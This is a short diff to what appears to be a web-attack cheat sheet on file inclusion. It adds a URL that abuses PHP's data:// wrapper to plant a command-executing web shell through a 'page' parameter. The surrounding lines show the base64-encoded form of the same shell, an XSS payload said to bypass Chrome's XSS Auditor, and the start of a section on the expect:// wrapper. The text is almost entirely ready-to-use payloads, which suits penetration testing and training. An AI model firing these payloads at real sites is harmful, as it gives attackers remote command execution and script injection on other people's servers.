@@ -161,6 +161,11 @@ http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbW
 NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
 ```
 
+```powershell
+http://example.net/?page=data://text/plain,<?php system($_GET['cmd']);echo 'Shell done !'; ?>
+NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
+```
+
 Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`
 
 ### Wrapper expect://
